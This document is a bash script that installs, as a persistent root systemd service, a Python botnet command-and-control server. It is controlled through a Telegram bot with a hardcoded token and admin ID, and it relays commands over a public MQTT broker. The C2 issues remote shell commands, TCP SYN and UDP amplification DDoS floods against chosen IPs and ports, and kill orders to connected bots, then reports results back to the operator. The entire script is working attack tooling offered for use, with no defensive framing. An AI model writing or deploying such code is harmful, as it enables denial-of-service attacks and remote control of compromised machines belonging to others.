#!/bin/bash
# ================================================
# TG C2 MASTER - FIXED NO ERROR (DIRECT PYTHON)
# ================================================

TOKEN="8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
ADMIN_ID="5699538596"

echo "🚀 TG C2 MASTER DEPLOY (FIXED)..."

# CREA FILE PYTHON PRIMA
cat > /opt/tg_c2.py << 'EOF'
#!/usr/bin/env python3
import telebot
import paho.mqtt.client as mqtt
import json
import threading
import re

TOKEN = '8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe'
ADMIN_ID = '5699538596'

bot = telebot.TeleBot(TOKEN)
brokers = {}
mqtt_brokers = {}

mqttc = mqtt.Client()
mqttc.reconnect_delay_set(min_delay=1, max_delay=120)

def on_connect(client, userdata, flags, rc):
    print('✅ MQTT DISCOVERY START')
    mqttc.subscribe('#')

def on_message(client, userdata, msg):
    global brokers, mqtt_brokers
    try:
        payload = msg.payload.decode()
        topic_parts = msg.topic.split('/')
        
        if len(topic_parts) > 2 and topic_parts[1] == 'broker' and topic_parts[2] == 'clients':
            broker_id = '/'.join(topic_parts[:2])
            data = json.loads(payload)
            clients = data.get('clients', 0)
            brokers[broker_id] = clients
            mqtt_brokers[broker_id] = broker_id
            total = sum(brokers.values())
            bot.send_message(ADMIN_ID, f'✅ NEW `{broker_id}` ({clients} clients)\n📊 {len(brokers)} brokers {total} bots', parse_mode='Markdown')
            
        elif 'c2_result' in msg.topic:
            result = json.loads(payload)
            bot.send_message(ADMIN_ID, f'📤 {result.get(\"broker\", \"UNK\")}\n```\n{result.get(\"output\", \"\")[:1900]}\n```', parse_mode='Markdown')
            
    except Exception as e:
        pass

mqttc.on_connect = on_connect
mqttc.on_message = on_message

@bot.message_handler(commands=['start'])
def start(msg):
    if str(msg.chat.id) != ADMIN_ID:
        bot.reply_to(msg, '❌ ACCESSO NEGATO')
        return
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(telebot.types.InlineKeyboardButton('⚡ TCPSYN', callback_data='tcpsyn'))
    markup.row(telebot.types.InlineKeyboardButton('🌊 UDPAMP', callback_data='udpamp'))
    markup.row(telebot.types.InlineKeyboardButton('📊 STATS', callback_data='stats'))
    markup.row(telebot.types.InlineKeyboardButton('📋 BROKERS', callback_data='brokers'))
    bot.send_message(msg.chat.id, '''
🚀 **TG C2 HIVEMQ** LIVE

Comandi:
/shell whoami
/kill
    ''', reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if str(call.message.chat.id) != ADMIN_ID: return
    if call.data == 'stats':
        total = sum(brokers.values())
        bot.answer_callback_query(call.id, f'Brokers: {len(brokers)} | Bots: {total}')
    elif call.data == 'brokers':
        txt = '📋 **BROKERS:**\n'
        for b, c in brokers.items():
            txt += f'• `{b}`: {c}\n'
        bot.edit_message_text(txt, call.message.chat.id, call.message.id, parse_mode='Markdown')
    else:
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f'🎯 {call.data.upper()}\nInvia: TCPSYN 8.8.8.8 80')

@bot.message_handler(func=lambda msg: msg.chat.id == int(ADMIN_ID))
def handle_commands(msg):
    text = msg.text.strip()
    
    # Shell
    if text.startswith('/shell '):
        cmd = text[7:]
        payload = json.dumps({'cmd': 'shell', 'payload': cmd})
        for broker in list(mqtt_brokers.keys()):
            mqttc.publish(f'{broker}/c2/cmd', payload)
        bot.reply_to(msg, f'🖥️ SHELL `{cmd}` → {len(brokers)}')
        return
    
    # DDOS
    parts = text.split()
    if len(parts) == 3 and parts[0].lower() in ['tcpsyn', 'udpamp']:
        cmd_type, ip, port = parts[0].lower(), parts[1], int(parts[2])
        payload = json.dumps({'cmd': cmd_type, 'target': ip, 'port': port})
        for broker in list(mqtt_brokers.keys()):
            mqttc.publish(f'{broker}/c2/cmd', payload)
        bot.reply_to(msg, f'⚡ **{cmd_type.upper()}** `{ip}:{port}` → {len(brokers)} brokers')
        return

@bot.message_handler(commands=['kill'])
def kill_all(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    payload = json.dumps({'cmd': 'kill'})
    for broker in list(mqtt_brokers.keys()):
        mqttc.publish(f'{broker}/c2/cmd', payload)
    bot.reply_to(msg, f'🛑 KILL → {len(brokers)} brokers')

if __name__ == '__main__':
    print('🚀 TG C2 MASTER START')
    threading.Thread(target=lambda: mqttc.connect('broker.hivemq.com', 1883, 60) or mqttc.loop_forever(), daemon=True).start()
    bot.polling(none_stop=True)
EOF

chmod +x /opt/tg_c2.py

# SYSTEMD SERVICE
cat > /etc/systemd/system/tg-c2.service << 'EOF'
[Unit]
Description=Telegram C2 Master
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt
ExecStart=/opt/tg_c2.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable tg-c2
systemctl restart tg-c2 || systemctl start tg-c2

echo "✅ TG C2 MASTER LIVE!"
echo "📱 Bot Telegram: /start"
echo "🔍 Logs: journalctl -u tg-c2 -f"
echo "✅ STATUS: $(systemctl is-active tg-c2)"
